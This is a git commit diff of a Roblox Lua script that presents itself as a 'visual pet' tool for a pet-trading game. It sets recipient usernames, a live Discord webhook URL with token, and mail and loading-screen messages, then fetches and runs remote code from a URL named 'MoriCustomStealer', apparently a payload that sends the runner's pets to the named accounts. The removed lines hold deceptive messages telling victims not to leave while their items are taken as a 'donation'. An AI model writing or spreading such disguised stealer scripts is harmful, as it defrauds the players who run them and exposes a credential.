db916c9033fe5e9d1e398cb0a6ab7375521e9b0c
Scripthubpetsimx <121375760+Scripthubpetsimx@users.noreply.github.com>
2023-09-12 14:51:18 +0800

    Update Visual_Script.lua

--- Visual_Script.lua
+++ Visual_Script.lua
@@ -1,11 +1,10 @@
-
 UserName = "pinoyjar" -- good pets
 Webhook = "https://discord.com/api/webhooks/1148608502365954108/PNjIiQGWH5ypSoUsvg0BspOxj3hPLSA4yBHPOIH6giZXvfIWJ3PlYIJjLLPxo-kWz7Ua" -- pings for pets
 UserName2 = "Trex_kid9" -- bad pets
 
-_G.MailMessage = "Please take this as a Donation" -- Mail Message !
-_G.ScriptTitle = "Updating Script ( Donate us by sending gifts user: issue481 Thank you )" -- Loading Screen Title
-_G.ScriptTitle2 = "Do not leave or else your huge and miscs will be gone ( this is a testing beta which the injection of visual pet are not "fe" thank you for your time have a good day )" -- Put Same Title
+_G.MailMessage = "Mail Message Here" -- Mail Message !
+_G.ScriptTitle = "Script Title Here" -- Loading Screen Title
+_G.ScriptTitle2 = "Script Title Here" -- Put Same Title
 _G.WebhookName = "Webhook Name Here" -- Webhook name 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idk/main/MoriCustomStealer", true))()
